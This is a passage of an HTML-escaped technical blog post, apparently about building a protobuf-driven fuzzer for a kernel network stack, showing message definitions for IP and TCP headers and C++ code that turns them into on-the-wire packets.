class="c1"&gt;]);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;val&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c6"&gt;get&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;set_sock_opt&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;val&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;data&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;size&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; setsockopt_wrapper&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;s&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;level&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;name&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;val&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c6"&gt;get&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;size&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;nullptr&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;break&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;While syscalls are typically a straightforward translation of the protobuf message, other commands are more complex. In order to improve the structure of randomly generated packets, I added custom message types that I then converted into the relevant on-the-wire structure before passing it into ip_input. Here&amp;rsquo;s how this looks for TCP:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.06a48b27c70500af6666b579bb650d3a174e966c"&gt;&lt;/a&gt;&lt;a id="t.10"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;message &lt;/span&gt;&lt;span class="c13"&gt;Packet&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; oneof packet &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c13"&gt;TcpPacket&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;tcp_packet &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;message &lt;/span&gt;&lt;span class="c13"&gt;TcpPacket&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;IpHdr&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ip_hdr &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;TcpHdr&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;tcp_hdr &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; optional bytes data &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;message &lt;/span&gt;&lt;span class="c13"&gt;IpHdr&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 ip_hl &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;IpVersion&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ip_v &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 ip_tos &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 ip_len &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;4&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 ip_id &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;5&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 ip_off &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;6&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 ip_ttl &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;7&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;Protocol&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ip_p &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;8&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;InAddr&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ip_src &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;9&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;InAddr&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ip_dst &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;10&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;message &lt;/span&gt;&lt;span class="c13"&gt;TcpHdr&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;Port&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;th_sport &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;Port&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;th_dport &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;TcpSeq&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;th_seq &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;TcpSeq&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;th_ack &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;4&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 th_off &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;5&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; repeated &lt;/span&gt;&lt;span class="c13"&gt;TcpFlag&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;th_flags &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;6&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 th_win &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;7&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 th_sum &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;8&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required uint32 th_urp &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;9&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// Ned&amp;#39;s extensions&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c6"&gt;bool&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;is_pure_syn &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;10&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c6"&gt;bool&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;is_pure_ack &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;11&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c15 c18"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;Unfortunately, protobuf doesn&amp;rsquo;t support a uint8 type, so I had to use uint32 for some fields. That&amp;rsquo;s some lost fuzzing performance. You can also see some synthetic TCP header flags I added to make certain flag combinations more likely: &lt;/span&gt;&lt;span class="c9"&gt;is_pure_syn&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c9"&gt;is_pure_ack&lt;/span&gt;&lt;span class="c8 c2"&gt;. Now I have to write some code to stitch together a valid packet from these nested fields. Shown below is the code to handle just the TCP header.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b04bea361f4572715c957400db3964f6b12a92e1"&gt;&lt;/a&gt;&lt;a id="t.11"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;std&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c6"&gt;string&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;get_tcp_hdr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;const&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;TcpHdr&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;hdr&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;tcphdr tcphdr &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_sport &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;unsigned&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;short&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_sport&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_dport &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;unsigned&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;short&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_dport&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_seq &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;__builtin_bswap32&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_seq&lt;/span&gt;&lt;span class="c1"&gt;()),&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_ack &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;__builtin_bswap32&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_ack&lt;/span&gt;&lt;span class="c1"&gt;()),&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_off &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_off&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_flags &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_win &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;unsigned&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;short&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_win&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_sum &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;// TODO(nedwill): calculate the checksum instead of skipping it&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_urp &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;unsigned&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;short&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_urp&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;const&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;flag &lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_flags&lt;/span&gt;&lt;span class="c1"&gt;())&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; tcphdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_flags &lt;/span&gt;&lt;span class="c1"&gt;^=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;flag&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// Prefer pure syn&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;is_pure_syn&lt;/span&gt;&lt;span class="c1"&gt;())&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; tcphdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_flags &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;~(&lt;/span&gt;&lt;span class="c0"&gt;TH_RST &lt;/span&gt;&lt;span class="c1"&gt;|&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;TH_ACK&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; tcphdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_flags &lt;/span&gt;&lt;span class="c1"&gt;|=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;TH_SYN&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;else&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;hdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;is_pure_ack&lt;/span&gt;&lt;span class="c1"&gt;())&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; tcphdr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;th_flags &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span 